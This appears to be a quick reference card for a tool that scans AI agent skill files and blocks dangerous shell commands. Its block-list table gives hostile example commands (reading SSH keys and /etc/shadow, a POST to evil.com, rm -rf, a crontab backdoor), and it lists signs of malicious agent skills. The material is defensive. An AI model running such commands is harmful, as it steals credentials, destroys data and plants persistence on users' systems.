# ASF Security - Quick Reference Card

## 🚀 2-Minute Setup

```bash
# 1. Download
curl -O https://asf.codes/asf-demo-capability-enforcer.sh
chmod +x asf-demo-capability-enforcer.sh

# 2. Load
source asf-demo-capability-enforcer.sh

# 3. Use
check_skill_capabilities suspicious-skill.md
asf_enforce "command to test"
```

## 🛡️ What Gets Blocked

| Attack Type | Pattern | Example |
|------------|---------|---------|
| SSH Theft | `.ssh/id_*` | `cat ~/.ssh/id_rsa` |
| Data Exfil | `curl.*POST` | `curl -X POST evil.com` |
| File Delete | `rm -rf` | `rm -rf /important` |
| Backdoors | `crontab` | `echo "* * *" >> crontab` |
| Passwords | `/etc/shadow` | `cat /etc/shadow` |

## ✅ Quick Tests

```bash
# Test if you're vulnerable
./check-agent-vulnerable.sh

# Test a safe command
asf_enforce 'ls -la'  # ✅ ALLOWED

# Test a dangerous command  
asf_enforce 'rm -rf /'  # ❌ BLOCKED

# Test any skill file
check_skill_capabilities /path/to/skill.md
```

## 🐍 Python Integration

```python
from asf_agent_protector import ASFProtector
protector = ASFProtector()

# Check before loading
safe, threats = protector.scan_skill("skill.md")
if not safe:
    print(f"Blocked: {threats}")
```

## 🔍 What to Look For

**Red Flags in Skills:**
- "Backup" skills asking for SSH access
- Skills that "optimize" by deleting files
- "Enhanced" versions of official skills
- Any skill encoding/decoding data
- Skills making POST requests

## 🚨 If You Find a Malicious Skill

1. **Don't run it** 
2. **Report it**: security@asf.codes
3. **Share the pattern** so we can update protection

## 📚 Full Documentation

- Docs: https://asf.codes/docs
- GitHub: https://github.com/agentsecurity/asf
- Community: https://discord.gg/agentsecurity

---

**Remember**: If a skill needs your SSH keys, it's not helping you - it's robbing you. 🔐